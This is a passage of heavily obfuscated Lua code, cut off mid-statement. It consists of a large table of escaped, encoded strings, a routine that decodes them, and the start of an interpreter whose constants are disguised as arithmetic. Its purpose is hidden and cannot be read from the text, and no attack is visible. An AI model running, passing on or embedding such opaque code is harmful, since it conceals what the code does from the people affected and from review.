\055\110\057\120\061\061"",""\100\048\067\079\098\084\049\084\079\083\061\061"";""\103\079\111\101\114\082\100\120\065\108\080\104\068\066\071\054\105\108\068\065\120\083\061\061"",""\069\099\056\104\107\056\053\075\075\103\114\098"",""\071\117\117\097\104\087\113\057\086\112\073\055\115\067\089\084\075\084\119\057"",""\068\113\090\051\069\087\043\118\049\071\047\103"",""\101\057\081\121\049\087\049\054\070\087\069\086\090\051\043\077"",""\089\077\047\072\048\089\080\114\099\119\099\082\107\104\089\050\073\069\115\072\122\082\047\101\112\076\068\049\112\076\043\112\080\083\100\121\120\122\071\071\087\119\103\079\119\043\114\086\053\097\048\121\100\105\113\119\067\073\108\053\109\121\118\108\104\048\048\103\048\076\113\082\121\057\047\120\052\085\081\088\097\099\082\075\066\076\099\107\117\075\054\065\111\101\074\056\122\083\061\061"",""\090\051\048\097\088\087\122\071\069\118\049\070\069\102\073\108\052\068\061\061"";""\080\118\117\104\066\120\066\065\107\089\097\098\085\049\048\061"";""\080\107\086\048\097\117\088\053\073\120\112\104"",""\111\117\104\072\078\088\073\081\082\048\080\083\052\068\061\061"",""\097\084\098\087\070\084\077\079\122\068\061\061"",""\073\087\043\054\073\114\053\082\052\057\098\061"",""\121\114\056\121\047\102\086\119\080\073\055\053\106\083\061\061"",""\043\071\082\089\057\104\076\061"",""\106\085\078\069\086\114\109\103\067\051\074\061"",""\111\104\071\052\052\071\051\061"",""\102\076\053\072\107\083\083\100\087\066\074\085\101\067\085\113\110\079\080\078"";""\073\051\082\107\099\111\103\051\113\048\053\088\090\048\047\108"";""\067\065\113\048\073\119\098\104"";""\104\115\097\074\102\043\084\055"";""\066\114\120\081\051\120\061\061"",""\120\066\101\051\065\088\072\061"",""\102\086\081\108\103\114\080\053\052\052\083\119"";""\072\051\082\089\097\109\077\052\106\107\053\084\082\083\061\061"";""\072\056\121\053\108\086\066\073\122\120\061\061"";""\085\087\110\121\054\117\108\061"";""\048\051\111\108\073\068\116\108\119\070\105\077\103\043\115\119\072\108\106\061"";""\073\070\076\075\117\087\075\121\069\057\043\055\099\119\080\111\076\083\061\061"","""";""\070\057\043\108\117\113\049\055"";""\075\117\110\097\052\098\088\113\081\072\061\061"";""\105\108\110\078\105\085\097\061"",""\101\118\081\081\098\114\121\116\049\108\055\115\090\113\055\121\088\087\108\061"";""\077\071\043\110\077\071\081\108"",""\110\087\067\117\069\055\048\083\086\057\081\054\084\112\054\119"";""\113\055\066\119\101\097\098\061"",""\109\049\088\117\088\068\061\061"",""\072\101\057\106\107\074\075\120\084\078\116\053\121\078\078\115\047\056\080\072\099\078\111\053\090\112\083\107\048\065\115\081\081\088\088\072\053\122\067\086\071\099\070\104\077\115\083\054\109\083\111\047\121\088\101\109\107\050\079\051\078\054\105\111\056\088\097\067\051\103\101\116\074\068\086\051\108\090\114\080\066\079\085\122\071\053\043\079\082\067\047\089\084\048\119\068\048\098\076\088\104\050\102\072\068\082\106\081\122\116\087\067"",""\085\077\057\108\110\073\099\049\070\066\106\078\069\109\110\115\081\090\090\068\114\069\081\083\048\114\117\066\051\083\061\061"",""\112\112\084\050\049\071\106\061"";""\088\113\055\054\073\087\081\110\077\071\101\061"";""\088\083\057\088"",""\104\052\051\109\078\113\110\079\105\120\061\061"";""\052\109\106\061"";""\056\072\114\051\108\101\083\111\101\076\118\121"",""\076\114\080\078\070\051\049\087\088\071\081\116\077\113\074\061"";""\079\099\101\099\069\072\061\061"",""\119\103\112\087\048\065\118\053"",""\056\109\103\117\068\075\056\076\113\101\081\089\056\048\056\114"";""\066\121\067\103\101\056\113\098\067\066\110\102\122\108\122\061"",""\101\079\043\122\114\073\107\100\107\068\061\061"",""\084\043\077\050\089\073\079\056\120\069\116\079\055\082\108\061"";""\065\122\089\117\116\072\061\061"",""\113\117\077\050\107\105\121\101\110\049\084\075\072\074\075\099\079\048\116\097\121\113\072\061"";""\069\105\053\076\087\115\115\075\075\055\106\056"",""\054\085\089\072\068\108\048\047\075\082\077\057"";""\076\056\067\105\082\047\102\117"";""\090\074\077\118\047\055\103\066"";""\110\070\067\054\114\100\098\072\054\055\057\053\103\071\122\061"",""\085\099\065\067\097\117\070\080\116\072\061\061"";""\049\074\083\053\055\079\074\061"";""\072\056\082\122\102\057\120\098"";""\075\110\053\067\087\104\043\068\107\070\088\067\106\106\120\048"",""\086\072\085\117\085\054\068\061"",""\090\113\055\075\052\068\061\061"";""\088\101\074\108\052\071\053\119\056\048\073\112\090\087\081\074"";""\100\079\121\071\106\118\074\087"";""\053\069\079\097\073\075\055\122\080\099\100\067\117\102\088\078"",""\053\088\056\108\112\117\106\082\069\084\102\048\101\078\114\052"",""\065\083\051\068\120\075\084\111\099\122\075\090\106\078\081\088\053\083\061\061"";""\090\066\108\112\086\087\110\116\075\048\103\055"";""\082\103\086\099\083\081\054\086\048\072\061\061"",""\114\049\107\079\082\103\107\097\068\072\061\061"",""\098\057\081\110\049\087\043\116"";""\116\083\083\088\065\072\061\061"";""\051\115\048\078\106\110\048\078\068\072\104\120\069\086\122\061"",""\113\081\080\101\073\054\049\112\076\081\051\054\090\109\080\077\076\083\061\061"";""\118\069\050\085\102\097\083\072"",""\085\114\076\055\099\118\069\054\077\108\090\054\076\057\043\114\069\070\083\061"";""\098\057\069\116\052\102\049\103"",""\085\120\061\061"",""\117\088\074\056\111\102\069\073"";""\072\078\087\108\122\083\061\061"",""\080\048\099\090\068\056\122\052"",""\085\077\102\067\076\075\082\101\122\078\109\103\106\085\109\049"";""\109\082\078\116\085\121\108\081"",""\100\119\098\071\098\081\113\079\103\103\119\097\089\047\074\107"",""\120\069\088\113\070\098\098\061"";""\070\054\105\076\050\119\117\122"",""\115\076\075\080\118\122\081\119\087\080\108\061"",""\056\057\088\116\067\116\122\050\050\083\081\068\082\104\072\076\088\056\067\108\122\077\098\122\108\047\077\067\099\102\086\051\089\107\067\072\104\050\076\086\080\112\075\069\097\105\114\069\088\073\107\103\078\099\085\050\122\119\067\057\097\103\114\043\078\080\098\075\068\104\088\083\115\109\079\087"";""\068\113\090\051\101\071\047\082\049\087\069\105"";""\098\057\069\075\117\051\055\112\098\087\049\084\090\087\073\071\056\102\083\061"";""\068\110\088\111\105\067\105\087\050\120\083\118\113\079\048\061"";""\085\088\100\108\079\117\115\106"",""\081\113\073\116\083\048\117\085\090\083\061\061"";""\077\111\083\075\049\070\081\078\056\108\043\088\052\071\108\108"",""\049\066\066\081\073\109\051\101"";""\099\084\104\053\117\098\076\061"";""\077\120\082\097\071\075\109\067\112\116\083\061"";""\077\050\115\121\088\076\068\061"",""\052\051\075\114\113\119\098\054\077\057\055\069\049\101\053\113"";""\052\109\048\061"";""\097\072\113\071\081\085\115\051\053\084\117\054\066\108\107\061"",""\084\117\087\119\109\112\083\061"";""\101\071\069\108\088\113\073\110\052\102\053\103\088\113\055\051\049\111\121\103\098\072\061\061"";""\074\100\115\108\075\120\061\061"";""\090\117\097\068\107\079\121\097\103\065\072\061"",""\113\109\105\073\048\067\072\098\117\080\082\066"";""\113\114\069\075\098\057\049\107\052\070\081\101\117\119\080\072"";""\117\108\067\048\043\050\074\109\049\069\077\082\056\087\090\074"";""\052\065\074\047\077\118\047\121\117\080\119\050\112\099\118\079"";""\110\043\089\057\085\081\120\122"";""\070\065\069\075\052\081\116\098\086\102\108\098\073\049\119\078\110\112\048\061"",""\114\050\043\115\052\120\061\061"";""\047\104\080\100\073\080\071\049"",""\083\068\072\112\054\079\079\057\111\079\076\115\070\116\076\066"",""\054\047\050\055\103\099\049\111\110\115\104\103"",""\108\080\115\068\085\120\070\078"",""\057\101\087\097\082\043\049\102"";""\108\100\115\077\119\107\056\057\097\073\048\083"";""\068\069\049\116\088\051\121\065\056\102\103\101\070\087\049\068\049\113\077\061"";""\098\087\073\075\077\057\097\075\052\108\043\118\056\057\073\104\076\068\061\061"";""\048\085\049\102\069\106\078\102\074\072\061\061"";""\070\116\111\080\074\114\101\061"",""\102\067\053\069\082\117\049\122\076\085\120\100"";""\075\115\109\076\112\053\078\067\115\088\068\049\067\121\107\068"",""\086\103\068\069\117\068\087\109"",""\089\082\078\070\070\087\049\080"";""\068\117\086\084\073\121\105\048\057\105\090\054\075\101\049\054"",""\050\102\072\048\068\074\047\074\078\111\050\086\122\110\074\061"",""\054\067\117\049\051\118\068\088"",""\090\057\056\106\052\113\056\071\069\102\069\103\077\054\049\057\049\069\101\061"";""\088\051\122\075\077\103\056\119\098\111\080\103\070\057\097\072\073\087\098\061"";""\070\071\055\109\117\087\081\110\049\071\069\051"";""\109\122\049\056\101\119\109\112\077\122\066\099\115\120\108\117\090\111\048\061""}local function X(X)return q[X-(-958462+1012914)]end for X,B in ipairs({{-33257-(-33258);-583923-(-584473)};{578221-578220,-406308+406488};{-828255+828436;609878-609328}})do while B[462227+-462226]<B[540735+-540733]do q[B[311841+-311840]],q[B[-841616+841618]],B[-429183+429184],B[668323-668321]=q[B[-70443+70445]],q[B[767269-767268]],B[-390601+390602]+(351911+-351910),B[946097-946095]-(-992319+992320)end end do local X={v=1034724+-1034685,x=1015389+-1015357,[""\043""]=-792092-(-792153),a=-475930-(-475986);M=-381909+381933,L=476492+-476480,[""\057""]=-740476+740514,q=560149+-560127;m=678333-678330;w=-327236-(-327271),P=-633155+633156;j=-928553+928561;[""\048""]=-816837+816841,l=-450368+450420,W=910117+-910111;X=-350061+350079,[""\056""]=-893534+893547;D=-318294-(-318310);K=524527+-524474,R=660740+-660699,[""\050""]=-12377-(-12439),E=927624-927603;T=-412361-(-412376);F=-114801-(-114820),k=-174473+174517,Q=-915669+915674,J=-25334+25374,c=-50826+50856,[""\053""]=769470+-769461;r=42538-42531,s=546358-546311,n=707043-706997,o=343523+-343500,y=356496+-356463,S=-500525-(-500525),[""\051""]=791372-791336,G=960560-960506;p=-852134+852145;H=553317-553269,[""\052""]=-195705-(-195732),i=-764496+764546;I=307091-307062,V=-268522+268532,U=-135980+135994;O=854236-854173,[""\049""]=-852883+852908;[""\055""]=917058+-917001,e=-374915+374935,f=11639-11584,A=439446-439388,C=-74573+74607,Z=1037015+-1036998;B=-583629-(-583688),u=863371-863345;N=-297243+297285;g=-829580-(-829617),[""\054""]=374273+-374222,t=902389-902344,h=-274838+274840;z=-620236+620296,d=-702408+702439,Y=-596767+596810;[""\047""]=-251092+251141;b=363078-363050}local B=type local J=q local k=table.concat local I=table.insert local K=string.sub local Q=string.len local Z=math.floor local n=string.char for q=-523866+523867,#J,-206912+206913 do local A=J[q]if B(A)==""\115\116\114\105\110\103""then local B=Q(A)local S={}local D=951188+-951187 local f=-1005026+1005026 local a=718019-718019 while D<=B do local q=K(A,D,D)local J=X[q]if J then f=f+J*(-656587+656651)^((1006931-1006928)-a)a=a+(-653993+653994)if a==-827153+827157 then a=-662465-(-662465)local q=Z(f/(-906-(-66442)))local X=Z((f%(-1010687+1076223))/(744272+-744016))local B=f%(191230+-190974)I(S,n(q,X,B))f=-531252+531252 end elseif q==""\061""then I(S,n(Z(f/(-838361-(-903897)))))if D>=B or K(A,D+(906913-906912),D+(720527-720526))~=""\061""then I(S,n(Z((f%(-270762-(-336298)))/(-744148+744404))))end break end D=D+(986690+-986689)end J[q]=k(S)end end end return(function(q,J,k,I,K,Q,Z,m,y,E,B,a,Y,b,r,D,f,A,v,M,l,G,S,n)y,r,M,A,f,a,B,b,S,v,l,m,G,E,Y,n,D=function(q,X)local J=f(X)local k=function()return B(q,{},X,J)end return k end,function(q,X)local J=f(X)local k=function(k,I,K,Q,Z,n,A)return B(q,{k,I;K;Q;Z,n;A},X,J)end return k end,function(q,X)local J=f(X)local k=function(k,I,K,Q,Z)return B(q,{k;I;K;Q;Z},X,J)end return k end,{},function(q)for X=-667424+667425,#q,-202310-(-202311)do A[q[X]]=A[q[X]]+(-345002-(-345003))end if k then local B=k(true)local J=K(B)J[X(819390-764624)],J[X(-438423-(-493195))],J[X(-587283-(-642001))]=q,a,function()return 33473-1025254 end return B else return I({},{[X(427352-372580)]=a,[X(-689462-(-744228))]=q,[X(888365-833647)]=function()return-412063+-579718 end})end end,function(q)local X,B=199819-199818,q[-990570-(-990571)]while B do A[B],X=A[B]-(-624178-(-624179)),(-210329+210330)+X if-460697+460697==A[B]then A[B],n[B]=nil,nil end B=q[X]end end,function(B,k,I,K)local A,H,J6,B6,d,N,c,k6,F,I6,h,o,T,e,w,z,O,U,m,s,K6,C,P,V,D,p,u,x,a,W,Z,g,X6,R,f,q6,i,j,t,L while B do if B<-563849+9319077 then if B<-210637+4236505 then if B<2766624-781868 then if B<642162-(-343832)then if B<368368-(-221304)then if B<571290-269182 then if B<641676-371305 then if B<849014+-717168 then if B<-955837-(-1033645)then c=c+o Z=c<=t d=not e Z=d and Z d=c>=t d=e and d Z=d or Z d=801404+2156711 B=Z and d Z=-601356+16027452 B=B or Z else f=B i=X(116524-61807)m=q[i]U=n[I[200834+-200832]]s=22094725129502-326894 V=n[I[803262-803259]]P=X(347784+-292884)T=V(P,s)i=U[T]a=m[i]U=n[I[577236+-577234]]m=X(213028+-158379)V=n[I[500117-500114]]P=X(-841203-(-896130))s=-422617+8848158098161 T=V(P,s)m=a[m]i=U[T]m=m(a,i)D=m B=m and-959807+11015631 or 159731+4020050 end else if B<881568-711023 then B=14537008-(-76675)f=n[I[768408-768402]]D=f==A Z=D else D=nil B=-196999+1251536 end end else if B<-198019-(-483022)then if B<818635+-539491 then P=X(825543+-771078)x=-128501+12749766167846 B=n[I[-1029561+1029564]]T=q[P]s=n[I[993763+-993762]]F=X(-763435+818126)H=n[I[182612+-182610]]g=H(F,x)P=s[g]V=T[P]P=204580+-204325 H=-185998-(-185998)s=-944526-(-944626)T={V(P,s,H)}U=B(i,J(T))B=-989780+2341645 else F=21422698002047-(-12408)T=X(-680528-(-735245))g=X(-211744-(-266560))V=q[T]P=n[I[-152705-(-152707)]]m=B s=n[I[894566-894563]]H=s(g,F)T=P[H]g=-774581+22781110254373 H=X(-97783-(-152340))U=V[T]T=n[I[-183692-(-183694)]]P=n[I[-394899+394902]]s=P(H,g)g=11508539966837-553094 V=T[s]i=U[V]T=n[I[-897795+897797]]H=X(562341+-507714)U=X(757615-702966)P=n[I[-549662+549665]]s=P(H,g)V=T[s]U=i[U]U=U(i,V)B=U and 11488715-(-570122)or 9074634-211294 a=U end else if B<-218638+511655 then i=X(96527+-42029)B=n[I[-1007548+1007549]]f=n[I[299769+-299767]]U=18468977079930-365794 a=n[I[338071+-338068]]m=a(i,U)D=f[m]f=y(-962447+1388793,{I[-950542+950544];I[-95381+95384];I[-874141-(-874145)]})Z=B(D,f)B=1575827-883207 else A=k[-193987+193988]B=A and 776722+1936837 or-512832+4448786 end end end else if B<-270484+653188 then if B<411050+-83290 then if B<822441+-507765 then Z=A B=D B=14923980-66933 else B=D B=15789566-(-975305)Z=A end else if B<-919436+1261153 then a=B V=X(-528174+582891)H=X(-968393-(-1022978))g=20906925325547-513764 U=q[V]T=n[I[305329-305328]]P=n[I[-473340+473342]]s=P(H,g)V=T[s]s=X(743455-688513)i=U[V]V=n[I[767024-767023]]T=n[I[-477088-(-477090)]]H=601809+19581781587149 P=T(s,H)U=V[P]m=i[U]i=X(297445-242796)V=n[I[-508041+508042]]T=n[I[179021-179019]]i=m[i]H=715477+4095914335390 s=X(334685+-279797)P=T(s,H)U=V[P]i=i(m,U)f=i B=i and 9946314-247593 or 10218412-216066 else F=X(20516-(-34441))B=-819000+9281072 x=5496971090380-(-880691)s=n[I[-642491-(-642492)]]H=n[I[547372-547370]]g=H(F,x)P=s[g]T=i[P]U=T end end else if B<-557899+1020892 then if B<566890+-151917 then s=X(967406-912791)U=X(700736+-646019)H=827367+23363858090648 i=q[U]V=n[I[-357612+357614]]T=n[I[597263-597260]]P=T(s,H)U=V[P]m=i[U]P=X(-531406+586095)U=n[I[948266+-948264]]s=30100591087670-(-534154)V=n[I[149499+-149496]]T=V(P,s)i=U[T]P=X(-832068+886689)a=m[i]U=n[I[-486739-(-486741)]]V=n[I[-976994-(-976997)]]s=2350032300621-(-727545)T=V(P,s)m=X(-982383-(-1037032))m=a[m]i=U[T]m=m(a,i)D=m B=695001+5635505 else D=X(-787142+841896)i=X(-427214+482045)A=q[D]f=n[I[812330-812329]]U=15086001203828-954116 a=n[I[656731-656729]]m=a(i,U)D=f[m]Z=A[D]D=n[I[462199-462198]]m=X(-3135+58054)f=n[I[-829590-(-829592)]]i=27340536961709-(-448270)a=f(m,i)A=D[a]B=Z[A]A=B B=A and 281409+11429609 or 13306767-(-176094)Z=A end else V=-694962+33624500525019 D=X(-887751-(-942468))A=q[D]a=n[I[-204871+204872]]D=X(-204223-(-258872))m=n[I[586687-586685]]D=A[D]U=X(91420+-36876)i=m(U,V)f=a[i]D=D(A,f)Z=D B=D and-110326+11765069 or 4041309-(-301158)end end end else if B<225861-(-610947)then if B<-323543-(-1033329)then if B<-952540+1588420 then if B<-598572+1218423 then B=q[X(-508485-(-563103))]Z={}A=nil else B=6848957-(-675022)end else if B<1306259-645425 then Z=A B=D B=14091280-(-434258)else A=nil Z={}B=q[X(-703234-(-758232))]end end else if B<1651259-830391 then if B<-534004+1255129 then A=k[-461993+461994]B=A and 15088908-964827 or 7087216-(-51028)else B=P B=Z and 9812032-(-540606)or 7515991-227838 end else B=q[X(-880468-(-935436))]Z={}end end else if B<209456+654985 then if B<-577545+1431723 then if B<1046536-200708 then B=D B=-731700+16758580 Z=A else f,i=a(D,f)B=f and 15242734-900448 or 424962+11209566 end else if B<188239+666250 then m=X(365342-310868)i=23576532721104-848622 D=n[I[-67770+67771]]f=n[I[246638-246636]]a=f(m,i)B=X(-476039-(-530688))B=A[B]Z=D[a]B=B(A,Z)D=B B=D and 3873560-695540 or 16735395-(-28162)Z=D else f=B i=X(57560+-2843)P=X(-925641+980550)m=q[i]U=n[I[652488+-652486]]s=35123254658508-476649 V=n[I[820674-820671]]T=V(P,s)s=-686205+18952587270902 P=X(911230+-856246)i=U[T]a=m[i]U=n[I[-754166-(-754168)]]m=X(-446910+501559)V=n[I[-604825+604828]]T=V(P,s)m=a[m]i=U[T]m=m(a,i)D=m B=m and 369405+-85063 or-290843+12758544 end end else if B<23135-(-920335)then if B<320884+573147 then B=1430576-145073 t=s==H c=t else B=4152998-(-152320)end else B=q[X(582717+-527716)]Z={}A=nil end end end end else if B<385182+980158 then if B<2091582-831865 then if B<739630+391903 then if B<718158+337565 then if B<53603+975918 then A=k[-85591+85592]a=not A f=k[943246+-943243]Z=a B=a and 12176158-775264 or-864156+13233859 D=k[-700817+700819]else B=q[X(257131-202533)]Z={}A=nil end else if B<1501659-385773 then B=n[I[30592+-30591]]B=B and 12376823-623753 or-118303+12964921 else Z={}B=q[X(-660612+715471)]A=nil end end else if B<721092-(-502325)then if B<268006+938369 then N=-303805+303806 z=R[N]B=213679+14469085 q6=z else f=-34363+34363 A=X(885740+-830791)B=q[A]D=n[I[914059-914051]]A=B(D,f)B=216146+13535816 end else if B<862649-(-376194)then B=V and-1029532+13982605 or-153027+8743909 else f=X(-572221-(-627006))a=S()A=k m=S()B=true D=S()n[D]=B Z=q[f]f=X(883546+-828560)B=Z[f]f=S()n[f]=B U=X(563151+-508246)B=Y(7040531-623112,{})n[a]=B B=false n[m]=B i=q[U]V=Y(12476402-(-218142),{m})U=i(V)Z=U B=U and-466136+10735279 or-811005+14264302 end end end else if B<1017850+332120 then if B<1273290-(-25885)then if B<629312-(-641018)then B=-249849+13537998 i=nil U=nil else n[D]=c B=n[D]B=B and 2262503-(-234146)or 14402593-(-215294)end else if B<2261160-923658 then H=X(-717486+772118)P=26065498286148-735451 i=n[I[794654-794653]]U=n[I[853347-853345]]T=X(237776-182952)V=U(T,P)Z=i[V]T=n[I[151169+-151168]]B=7880141-(-879080)g=2153925420052-(-303062)P=n[I[394878-394876]]s=P(H,g)V=T[s]H=X(714034+-659056)U=D[V]T=n[I[-680619+680620]]P=n[I[-772009+772011]]g=-178901+28263747907134 s=P(H,g)V=T[s]i=U[V]m[Z]=i else Z=X(-95545-(-150332))m=X(-762997-(-817771))m=A[m]B=q[Z]a={m(A)}m={B(J(a))}D=m[200947+-200945]B=694865+10243085 Z=m[-105575-(-105576)]f=m[-514185+514188]a=Z end end else if B<342606+1016625 then if B<-843700+2196291 then B=10379768-(-558182)i=nil m=nil else i=X(406361+-351644)P=X(-907338+962331)m=q[i]U=n[I[-974629+974630]]s=21900175917540-6670 V=n[I[371945+-371943]]T=V(P,s)i=U[T]T=X(-399949-(-454572))a=m[i]i=n[I[-295512+295513]]U=n[I[-208511-(-208513)]]P=924437+14543303114591 V=U(T,P)m=i[V]f=a[m]i=n[I[-780573-(-780574)]]T=X(567116-512556)a=X(679668+-625019)U=n[I[190162-190160]]a=f[a]P=-594123+14648373980016 V=U(T,P)m=i[V]a=a(f,m)A=a B=5528089-59472 end else B=n[I[735411-735406]]f=n[I[612620+-612618]]T=-540222+27382930894861 i=X(690783+-635885)a=n[I[804208-804205]]U=389821764695-(-355422)m=a(i,U)D=f[m]Z=B(D)f=X(-927559-(-982276))D=q[f]m=n[I[194094-194092]]V=X(-176265+231185)i=n[I[437226+-437223]]f=X(187223+-132574)U=i(V,T)f=D[f]a=m[U]f=f(D,a)Z=f B=f and 7661-(-847117)or 9692628-(-1001459)end end end else if B<1014335-(-715980)then if B<-393370+1987399 then if B<1255520-(-144561)then if B<497778-(-882756)then f=6231271-(-336436)D=X(-911607+966328)Z=-585865+8363431 A=D^f B=Z-A Z=X(-801094-(-855597))A=B B=Z/A Z={B}B=q[X(-584522+639249)]else B=V and 16016620-386483 or 6910265-197776 end else if B<-969414+2444783 then Z=A B=D B=256471+14179084 else f=B i=X(-87571+142288)P=X(111843-56964)m=q[i]U=n[I[688726-688724]]V=n[I[-678046-(-678049)]]s=-681906+22360509763678 T=V(P,s)P=X(1055530-1000702)s=-501787+24143199671301 i=U[T]a=m[i]U=n[I[1025125+-1025123]]m=X(-620404+675053)V=n[I[-626078+626081]]T=V(P,s)i=U[T]m=a[m]m=m(a,i)D=m B=m and-140682+13682899 or-402808+8262492 end end else if B<586566+1091942 then if B<628988-(-994174)then i=n[I[956033-956032]]P=24070304726013-(-94155)B=10131020-(-993522)U=n[I[754690-754688]]T=X(398778-344237)V=U(T,P)m=i[V]a=A[m]s=22843020491813-(-666984)U=n[I[-768603-(-768604)]]m=X(825781+-771081)P=X(-402226+457084)m=a[m]V=n[I[291338-291336]]T=V(P,s)i=U[T]m=m(a,i)D=m else Z=X(653088-598301)m=X(260339-205565)m=A[m]B=q[Z]a={m(A)}m={B(J(a))}Z=m[-397139-(-397140)]D=m[-715704-(-715706)]f=m[-764720-(-764723)]a=Z B=940471+8060537 end else B=m m=nil Z=a or m a=Z m=B Z=a B=a and 254498+11966897 or 8750306-(-820159)end end else if B<-394562+2239456 then if B<930113-(-823397)then if B<-403580+2150933 then a=n[I[673914-673912]]U=X(1011076-956100)m=n[I[-551544-(-551547)]]V=2702271515490-853624 i=m(U,V)f=a[i]Z=D[f]U=X(-453424-(-507915))V=26444075942683-611074 a=n[I[112380+-112378]]m=n[I[725154+-725151]]i=m(U,V)f=a[i]B=Z[f]f=n[I[596809+-596807]]i=X(901220-846492)U=32128762147559-96374 a=n[I[-394782-(-394785)]]m=a(i,U)Z=f[m]f=538395-538379 B[Z]=f B=14871511-(-64044)else B=V and 48970+8836313 or 958306-(-309144)end else if B<-920516+2714101 then A=Z B=A and-578091+11572994 or-319858+7812044 else A=nil Z={}B=q[X(-937698-(-992628))]end end else if B<978162-(-1002161)then if B<-596196+2464862 then B=-58184+9059192 i=nil m=nil else Z=X(418801-364014)m=X(-597387+652161)B=q[Z]m=A[m]a={m(A)}m={B(J(a))}B=6395861-(-364854)D=m[-252419-(-252421)]f=m[-892948-(-892951)]Z=m[24096+-24095]a=Z end else Z={}A=nil B=q[X(832314-777813)]end end end end end else if B<764975+2378318 then if B<-129790+2728029 then if B<-973279+3388258 then if B<2856274-718391 then if B<1676628-(-373517)then if B<1008703-(-993987)then Z={}A=nil B=q[X(178998-124286)]else D=n[I[-407585+407588]]f=683197+-683165 A=D%f a=n[I[-141379+141383]]s=544946+-544933 T=-750872+750874 U=n[I[436741-436739]]B=986841+6650970 F=n[I[206144+-206141]]g=F-A F=921455-921423 H=g/F P=s-H V=T^P i=U/V m=a(i)a=4295312900-345604 f=m%a m=-143119-(-143121)a=m^A D=f/a T=-853042-(-853298)V=38548+-38547 a=n[I[58597-58593]]U=D%V V=4294121993-(-845303)i=U*V U=814756+-749220 m=a(i)a=n[I[-7781-(-7785)]]i=a(D)f=m+i D=nil m=703638-638102 a=f%m s=636883+-636627 i=f-a m=i/U U=-753244-(-753500)i=a%U V=a-i U=V/T a=nil T=560568+-560312 V=m%T P=m-V f=nil T=P/s A=nil m=nil P={i,U;V;T}V=nil n[I[-598871-(-598872)]]=P U=nil T=nil i=nil end else if B<-82167+2153297 then D=k[-546322-(-546324)]B=n[I[-993584-(-993585)]]A=k[25569-25568]f=B B=f[D]B=B and 5786517-909199 or 14549444-(-929172)else H=X(-811363+865888)T=n[I[27656+-27655]]B=V V=Z P=n[I[926215-926213]]g=282423+10216750613342 s=P(H,g)Z=T[s]P=B T=Z B=V and-684537+12497562 or 1367429-569786 Z=V end end else if B<1478474-(-766724)then if B<3057422-847928 then B=Z and 6836910-(-539024)or 633354+11550522 else B=f B=12090442-570094 Z=D end else if B<-999525+3401351 then Z=X(305448-250448)B=q[Z]a=n[I[267670-267667]]m={B(a)}Z=m[-305282-(-305283)]D=m[-277485-(-277487)]a=Z f=m[91829+-91826]B=-357922+1211321 else s=X(1048251-993786)c=2853913119858-689986 B=n[I[529183-529179]]P=q[s]x=X(-774697+829154)H=n[I[528268-528267]]g=n[I[-592948+592950]]F=g(x,c)s=H[F]T=P[s]g=-669165+669293 H=957560-957305 s=-74894+75149 P={T(s,H,g)}V=B(U,i,J(P))B=-787813+5767462 end end end else if B<1590709-(-904397)then if B<3021875-565697 then if B<183315+2247559 then D=Z B=D and-760150+15951699 or-351118+14402429 else g=X(-840349-(-895241))B=517200+13750779 H=q[g]g=X(812343+-757460)s=H[g]T=s end else if B<-472148+2954955 then B=q[X(336302-281713)]A=nil Z={}else D=X(23335+31382)A=q[D]U=X(111404-56489)a=n[I[463294+-463293]]m=n[I[1032426+-1032424]]V=18939601427721-(-771434)i=m(U,V)D=X(449149+-394500)f=a[i]D=A[D]D=D(A,f)Z=D B=D and 381485+4387503 or-375169+16402049 end end else if B<-1042138+3610184 then if B<2717962-196030 then B=402211+12117020 else Z={}B=q[X(-337957-(-392691))]end else F=X(-459021-(-514015))P=X(202547-148082)x=-26096+12707943316749 B=n[I[-593699-(-593702)]]T=q[P]s=n[I[555146+-555145]]H=n[I[-426553+426555]]g=H(F,x)P=s[g]H=-622478+622733 s=-624356+624556 V=T[P]P=-417406+417406 T={V(P,s,H)}U=B(i,J(T))B=-754276+2606714 end end end else if B<2666869-(-257566)then if B<2611604-(-142965)then if B<346425+2325076 then if B<-68642+2730346 then i=nil B=-264457+14169886 m=nil else F=25698510748707-757093 B=n[I[931050-931047]]g=X(-628908-(-683675))P=n[I[763945-763944]]s=n[I[272899-272897]]H=s(g,F)T=P[H]F=29555114127226-(-968264)g=X(-154424+209046)V=i[T]P=n[I[-642610-(-642611)]]s=n[I[-290638+290640]]H=s(g,F)T=P[H]H=X(-953284-(-1007749))s=q[H]c=X(-843929-(-898795))t=-335026+6844906219813 g=n[I[-959113+959114]]F=n[I[-710040-(-710042)]]x=F(c,t)H=g[x]g=804825-804570 P=s[H]H=-642942-(-643197)F=94149-93894 s={P(H,g,F)}U=B(V,T,J(s))B=3073553-424119 end else if B<-567400+3268058 then i=X(253149-198671)B=n[I[310682-310681]]U=31770697528993-(-754473)f=n[I[-391128+391130]]a=n[I[-683599-(-683602)]]m=a(i,U)D=f[m]f=y(9591583-768189,{I[-674642-(-674644)];I[11655+-11652],I[398544+-398540]})Z=B(D,f)B=-329025-(-942221)else B=n[I[-214152-(-214153)]]i=X(-749537+804480)f=n[I[899898+-899896]]a=n[I[308308+-308305]]U=26642238623064-(-107294)m=a(i,U)D=f[m]f=E(12112480-(-1001671),{I[-430294+430296];I[232518-232515];I[565507+-565503]})Z=B(D,f)B=-853773+4761632 end end else if B<2125751-(-743240)then if B<2713636-(-53716)then D=Z B=D and 16768227-339890 or 7706626-182647 else Z=X(428053+-373266)m=X(49029+5745)B=q[Z]m=A[m]a={m(A)}m={B(J(a))}B=14018834-113405 f=m[222403+-222400]D=m[855553+-855551]Z=m[-833952+833953]a=Z end else P=X(-573816-(-628699))T=q[P]Z=T B=-447890+10367887 end end else if B<3463554-493860 then if B<388655+2546478 then if B<3442757-508004 then A=Z B=A and 16245762-(-524006)or-992189+2973858 else Z={}A=nil B=q[X(1004224-949594)]D=nil end else if B<2676244-(-264971)then B=n[I[879662+-879656]]Z=B(D)B=621377-442957 else d=S()L=X(553937-499034)n[d]=c Z=q[L]L=X(-396470-(-451040))B=Z[L]p=822312-822212 L=946984-946983 Z=B(L,p)N=X(-681099+735607)w=-609617+609872 L=S()n[L]=Z p=114982+-114982 B=n[U]Z=B(p,w)R=194751-194749 C=635847-635846 p=S()n[p]=Z B=n[U]w=705405-705404 O=-908016+908016 h=n[L]Z=B(w,h)w=S()n[w]=Z Z=n[U]u=288166-278166 h=Z(C,R)R=X(903160+-848583)Z=-229705+229706 B=h==Z h=S()n[h]=B z=q[N]Z=X(74505+-19528)W=n[U]j={W(O,u)}N=z(J(j))z=X(794110+-739533)q6=N..z C=R..q6 B=X(512533-457809)R=X(-575239-(-630144))B=F[B]B=B(F,Z,C)C=S()q6=M(4170641-(-695620),{U;d,P,f;D,x;h,C;L;w;p,T})n[C]=B 